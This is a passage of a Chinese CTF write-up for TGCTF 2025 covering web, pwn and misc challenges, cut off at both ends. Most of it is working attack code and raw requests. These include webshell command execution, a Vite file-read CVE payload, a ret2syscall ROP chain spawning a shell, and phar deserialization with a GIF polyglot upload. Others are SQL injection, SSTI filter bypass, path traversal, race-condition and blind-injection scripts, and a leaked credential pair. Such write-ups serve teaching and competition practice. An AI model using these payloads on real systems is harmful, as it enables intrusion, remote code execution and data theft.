VhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"\nContent-Type: application/octet-stream\n\n111\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B--\nPOST /class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt HTTP/1.1\nHost: node1.tgctf.woooo.tech:32439\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Length: 11\n\nwow=cat /f*\n```\n\n### 前端GAME\n\n紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。\n\n这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&raw??即可\n\n```\nhttp://node1.tgctf.woooo.tech:32360/@fs/tgflagggg?import&raw??\n```\n\n### 前端GAME plus\n\n参考[https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC](https://blog.meteorkai.top/2025/04/04/Vite开发服务器任意文件读取漏洞分析复现-CVE-2025-31125/#未公开POC)\n\n```\n/@fs/tgflagggg?import&?meteorkai.svg?.wasm?init\n```\n\n### 火眼辩魑魅\n\nrobots.txt 直接打 tgshell.php\n\n无过滤，直接POST传cat /f*一把梭了\n\n### 熟悉的配方，熟悉的味道\n\n狠狠非预期！！！\n\n直接打盲注好吧。\n\n```python\nimport string\nimport requests\nfrom tqdm import tqdm\nurl = \"http://node1.tgctf.woooo.tech:30215\"\nflag = \"TGCTF{028b2d11-2783-464c-8cea-fda040\"\n\nfor i in range(len(flag),50):\n    # for s in 'TGCTF{':\n    for s in tqdm('-'+'}'+'{'+string.ascii_lowercase+string.digits):\n        data = {\"expr\":f\"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[{i}],'{s}'));1/a\"}\n        # res = requests.post(url, data=json)\n        res = requests.post(url, data=data)\n        # print(res.text, s)\n        if res.text != \"A server error occurred.  Please contact the administrator.\":\n            flag += s\n            print(flag)\n            break\n    print(i)\n```\n\n只要flag逐位是对的上的就会触发1/0进而报错。否则就是1/1正常。布尔盲注打完了。\n\n### 直面天命\n\n/hints发现有路由。爆破。打到/aazz。可以传参。那就arjun扫。发现filename参数。\n\n路径穿越出。\n\nhttp://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag\n\n### TG_wordpress\n\n/robots.txt进去。看到/.tmp/vuln和/.tmp/.bak。.bak发现服务器在52013开了vuln服务（nc可以连）\n\nret2syscall 直接ROPgadgets可以一把梭。\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\nio=process(\"./gets\")\n#io=remote()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\np = b\"A\"*40\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e0) # @ .data\np += p64(0x0000000000419484) # pop rax ; ret\np += b'/bin//sh'\np += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x000000000043d350) # xor rax, rax ; ret\np += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret\np += p64(0x0000000000401f2f) # pop rdi ; ret\np += p64(0x00000000004c50e0) # @ .data\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x000000000047f2eb) # pop rdx ; pop rbx ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x4141414141414141) # padding\np += p64(0x000000000043d350) # xor rax, rax ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000401ce4) # syscall\nio.sendline(p)\nio.interactive()\n```\n\n打到账密。TG_wordpressor, aXx^oV@K&cFoVatzQ*\n\n进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。\n\n配置文件有过滤。可以使用如下绕过：\n\n```php\n<?= call_user_func('sys'.'tem', 'cat /f*'); ?>\n```\n\n打进去就有了。\n\n### AAA偷渡阴平（复仇）\n\n没有禁止session相关。\n\npayload:\n\n```http\nGET /?tgctf2025=session_id();session_start();system(hex2bin(session_id())); HTTP/1.1\nHost: node2.tgctf.woooo.tech:32385\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nCookie: PHPSESSID=636174202f662a\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n\n### 什么文件上传？（复仇）\n\nfile_exists可以出发phar。易得：\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass yesterday {\n    public $learn;\n    public $study=\"study\";\n    public $try;\n    public function __construct()\n    {\n        $this->learn = \"learn<br>\";\n    }\n    public function __destruct()\n    {\n        echo \"You studied hard yesterday.<br>\";\n        return $this->study->hard();\n    }\n}\nclass today {\n    public $doing;\n    public $did;\n    public $done;\n    public function __construct(){\n        $this->did = \"What you did makes you outstanding.<br>\";\n    }\n    public function __call($arg1, $arg2)\n    {\n        $this->done = \"And what you've done has given you a choice.<br>\";\n        echo $this->done;\n        if(md5(md5($this->doing))==666){\n            return $this->doing();\n        }\n        else{\n            return $this->doing->better;\n        }\n    }\n}\nclass tommoraw {\n    public $good;\n    public $bad;\n    public $soso;\n    public function __invoke(){\n        $this->good=\"You'll be good tommoraw!<br>\";\n        echo $this->good;\n    }\n    public function __get($arg1){\n        $this->bad=\"You'll be bad tommoraw!<br>\";\n    }\n\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;\n\n    public function __set($arg1, $arg2) {\n        if ($this->out->useful7) {\n            echo \"Seven is my lucky number<br>\";\n            system('whoami');\n        }\n    }\n    public function __toString(){\n        echo \"This is your future.<br>\";\n        system($_POST[\"wow\"]);\n        return \"win\";\n    }\n    public function __destruct(){\n        $this->no = \"no\";\n        return $this->no;\n    }\n}\n$a = new yesterday();\n$a -> study = new today();\n$a -> study -> doing = new future();\n\n// 后缀必须为phar\n$phar = new Phar(\"evil.phar\");\n$phar->startBuffering();\n// 设置 stubb\n$phar->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");\n/**\n将自定义的 meta-data 存入 manifest\n这个函数需要在php.ini中修改 phar.readonly 为 Off\n否则的话会抛出 \ncreating archive \"***.phar\" disabled by the php.ini setting phar.readonly \n异常.\n*/\n$$phar->setMetadata($$a);\n// 添加需压缩的文件\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n\n?>\n```\n\n随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：\n\n```php\n<?php\nif(isset($_FILES['file'])) {\n    $uploadDir = 'uploads/';\n    if(!file_exists($uploadDir)) {\n        mkdir($uploadDir, 0777, true);\n    }\n\n    // 白名单允许的扩展名\n    $allowedExtensions = ['atg'];\n    $fileName = basename($_FILES['file']['name']);\n    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n\n    // 检查文件扩展名\n    if(!in_array($fileExtension, $allowedExtensions)) {\n        die(\"hacker！\");\n    }\n\n    $uploadFile = $uploadDir . $fileName;\n\n    if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {\n        echo \"文件已保存到：$uploadFile ！\";\n    } else {\n        echo \"文件保存出错！\";\n    }\n}\n?>\n```\n\n允许上传atg文件。\n\n后面易得：\n\n```http\nPOST /upload.php HTTP/1.1\nHost: node1.tgctf.woooo.tech:30759\nContent-Length: 940\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:30759\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary1OUR0mqZmZ8AtAOc\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:30759/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary1OUR0mqZmZ8AtAOc\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.atg\"\nContent-Type: application/octet-stream\n\nGIF89a<?php __HALT_COMPILER(); ?>\n此处有不可见字符省略。内容为上述脚本生成的phar\nPOST /class.php?filename=phar://./uploads/evil.atg/test.txt HTTP/1.1\nHost: node1.tgctf.woooo.tech:30759\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length: 7\n\nwow=env\n```\n\n### TGCTF 2025 后台管理\n\n反斜杠转义字符串中的'，然后在password里打SQL注入。\n\n误打误撞试出来flag在flag表里（（（\n\n```http\nPOST /login HTTP/1.1\nHost: 124.71.147.99:9045\nContent-Length: 48\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://124.71.147.99:9045\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://124.71.147.99:9045/login\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\nusername=1\\&password=union select *,2 from flag#\n```\n\n在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}\n\n### 老登，炸鱼来了？\n\n竞争safe变量。\n\n```python\nimport aiohttp\nimport asyncio\nimport time\n\nclass Solver:\n    def __init__(self, baseUrl):\n        self.baseUrl = baseUrl\n        self.READ_FILE_ENDPOINT = f'{self.baseUrl}'\n        self.VALID_CHECK_PARAMETER = '/write?name=123.md&content=flag&format=markdown'\n        self.INVALID_CHECK_PARAMETER = '/read?name=../../../../../flag'\n        self.RACE_CONDITION_JOBS = 100\n\n    async def setSessionCookie(self, session):\n        await session.get(self.baseUrl)\n\n    async def raceValidationCheck(self, session, parameter):\n        url = f'{self.READ_FILE_ENDPOINT}{parameter}'\n        async with session.get(url) as response:\n            return await response.text()\n\n    async def raceCondition(self, session):\n        tasks = list()\n        for _ in range(self.RACE_CONDITION_JOBS):\n            tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER))\n            tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER))\n        return await asyncio.gather(*tasks)\n\n    async def solve(self):\n        async with aiohttp.ClientSession() as session:\n            await asyncio.sleep(1) # wait for the reverse proxy creation\n\n            attempts = 1\n            finishedRaceConditionJobs = 0\n            while True:\n                print(f'[*] Attempts #{attempts} - Finished race condition jobs: {finishedRaceConditionJobs}', end='\\r')\n\n                results = await self.raceCondition(session)\n                attempts += 1\n                finishedRaceConditionJobs += self.RACE_CONDITION_JOBS\n                for result in results:\n                    print(result)\n                    if 'TGCTF{' not in result:\n                        continue\n\n                    print(f'\\n[+] We won the race window! Flag: {result.strip()}')\n                    exit(0)\n\nif name == '__main__':\n    baseUrl = 'http://node1.tgctf.woooo.tech:30308' # for local testing\n    # baseUrl = 'http://49.13.169.154:8088'\n    solver = Solver(baseUrl)\n\n    asyncio.run(solver.solve())\n```\n\n### 直面天命（复仇）\n\n直接去非复仇版本里读：\n\nhttp://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py\n\nsecret_key = \"直面天命\"\n\n然后标准SSTI即可。unicode编码绕过。 。 \n\n```bash\n直面天命g['\\u0070\\u006f\\u0070']['\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f']['\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f']['\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f']('so'[::-1])['\\u0070\\u006f\\u0070\\u0065\\u006e']('cat /*')['\\u0072\\u0065\\u0061\\u0064']()难违\n```\n\n\n\n## Misc\n\n### next is the end\n\n手动打开文件夹，得到flag。\n\n![img](/images/1744633170179-41.png)\n\n### where_it_is\n\n百度识图找到另一个视角的正面图。\n\n![img](/images/1744633170179-42.png)\n\n可以模糊看出学校名前两个字**\"内湖\"**，结合原图的职业二字，在360地图搜索找到对应学校。\n\n![img](/images/1744633170179-43.png)\n\n旁边的站就是港墘站\n\nTGCTF{港墘站}\n\n### 你的运气是好是坏？\n\nCTF自然常数（。\n\nflag{114514}\n\n### TeamGipsy&ctfer\n\nvm运行虚拟机，发现有密码。\n\n在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init=/bin/bash，再按F10启动。\n\n然后找到用户名，修改密码为123即可。\n\n![img](/images/1744633170179-44.png)\n\n桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。\n\n![img](/images/1744633170179-45.png)\n\n重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。\n\n![img](/images/1744633170179-46.png)\n\n![img](/images/1744633170179-47.png)\n\nHZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}\n\n### ez_zip\n\n最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。\n\n打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。\n\n所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。\n\n![img](/images/1744633170179-48.png)\n\n将sha512结果存放End/sh512.txt\n\n![img](/images/1744633170179-49.png)\n\ndeflate压缩，压缩等级1。\n\n![img](/images/1744633170179-50.png)\n\n使用ARCHPR进行明文攻击解压出flag.zip。\n\n![img](/images/1744633170179-51.png)\n\n没法正常解压，使用010的zip模板进行修复。\n\n将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。\n\n![img](/images/1744633170179-52.png)\n\n![img](/images/1744633170179-53.png)\n\nTGCTF{Warrior_You_have_defeated_the_giant_dragon!}\n\n### 这是啥o_o\n\n给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码\n\n![img](/images/1744633170179-54.png)\n\n扫描得到提示 time is your fortune ,efficiency is your life\n\n推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西\n\n![img](/images/1744633170179-55.png)\n\n解码得到flag\n\n```Plain\nenc=[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]\nfor i in enc:\n    print(chr(i),end='')\n```\n\n> TGCTF{You_caught_up_with_time!}\n\n### 你能发现图中的秘密吗?\n\n题目给出一个压缩包和一个png,压缩包有密码\n\npng查看red通道的lsb,发现密钥\n\n![img](/images/1744633170179-56.png)\n\n解压后给了一个png一个pdf\n\n查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag\n\n![img](/images/1744633170179-57.png)\n\nfinal_challenge2.png的一个chunk大小异常。\n\n![img](/images/1744633170179-58.png)\n\n提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。\n\n![img](/images/1744633170179-59.png)\n\nflag{you_are_so_attentive_and_conscientous}\n","slug":"TGCTF25-不知道-WP","published":1,"updated":"2025-04-14T14:13:56.005Z","comments":1,"layout":"post","photos":[],"_id":"cm9r3mmet000af0lsgtri6h0f","content":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名：3</strong></p>\n<p><img src=\"/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png\" loading=\"lazy\"></p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"AAAAAAAA·真·签到\"><a href=\"#AAAAAAAA·真·签到\" class=\"headerlink\" title=\"AAAAAAAA·真·签到\"></a>AAAAAAAA·真·签到</h3><p>UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}</p>\n<p>和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">enc<span class=\"token operator\">=</span><span class=\"token string\">'UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;'</span>\n\ns<span class=\"token operator\">=</span><span class=\"token string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span>\n\n        ind<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        ind<span class=\"token operator\">+=</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>ind<span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token 